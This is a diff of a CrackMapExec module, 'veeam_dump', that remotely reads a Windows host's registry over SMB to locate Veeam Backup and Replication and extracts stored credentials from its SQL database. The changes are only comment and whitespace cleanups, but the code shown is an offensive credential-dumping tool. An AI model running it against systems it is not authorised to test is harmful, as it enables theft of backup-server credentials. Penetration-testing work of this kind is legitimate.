@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-# Initially created by @sadshade, all output to him:
+# Initially created by @sadshade, all credit to him:
 # https://github.com/sadshade/veeam-output
 
 from impacket.dcerpc.v5.rpcrt import DCERPCException
@@ -10,15 +10,15 @@ import traceback
 from base64 import b64encode
 from cme.helpers.powershell import get_ps_script
 
+
 class CMEModule:
     '''
         Module by @NeffIsBack
-
     '''
     name = 'veeam_dump'
     description = 'Extracts credentials from local Veeam SQL Database'
     supported_protocols = ['smb']
-    opsec_safe= True 
+    opsec_safe = True
     multiple_hosts = True
 
     def __init__(self):
@@ -36,14 +36,14 @@ class CMEModule:
         SqlDatabase = ""
         SqlInstance = ""
         SqlServer = ""
-        
+
         try:
             remoteOps = RemoteOperations(connection.conn, False)
             remoteOps.enableRegistry()
 
             ans = rrp.hOpenLocalMachine(remoteOps._RemoteOperations__rrp)
             regHandle = ans['phKey']
-            
+
             ans = rrp.hBaseRegOpenKey(remoteOps._RemoteOperations__rrp, regHandle, 'SOFTWARE\\Veeam\\Veeam Backup and Replication')
             keyHandle = ans['phkResult']
 
@@ -60,7 +60,7 @@ class CMEModule:
         finally:
             remoteOps.finish()
         return [SqlDatabase, SqlInstance, SqlServer]
-    
+
     def stripXmlOutput(self, context, output):
         return output.split("CLIXML")[1].split("<Objs Version")[0]
 
@@ -86,7 +86,6 @@ class CMEModule:
         for account in output_stripped:
             user, password = account.split(" ", 1)
             context.log.highlight(user + ":" + password)
-        
 
     def on_admin_login(self, context, connection):
         SqlDatabase, SqlInstance, SqlServer = self.checkVeeamInstalled(context, connection)
